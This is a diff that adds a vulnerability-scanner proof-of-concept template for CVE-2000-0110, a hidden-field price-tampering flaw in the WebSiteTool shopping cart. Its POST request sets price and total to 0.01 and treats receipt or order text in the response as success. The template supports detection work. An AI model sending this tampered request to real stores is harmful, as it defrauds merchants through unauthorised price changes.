@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "WebSiteTool购物车隐藏表单域篡改漏洞验证 - 通过修改POST请求中隐藏字段值（如价格、总金额等敏感购买信息）验证服务器端未校验导致的非授权数据篡改"
+id = "POC-AVE-2000-0094"
+name = "CVE-2000-0110 PoC"
+severity = "high"
+tags = ["ave-2000-0094"]
+vuln_id = [
+    "CVE-2000-0110",
+    "AVE-2000-0094",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/WebSiteTool/cart.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "item_id=1&quantity=1&price=0.01&total=0.01"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "receipt",
+    "order",
+    "confirm",
+]
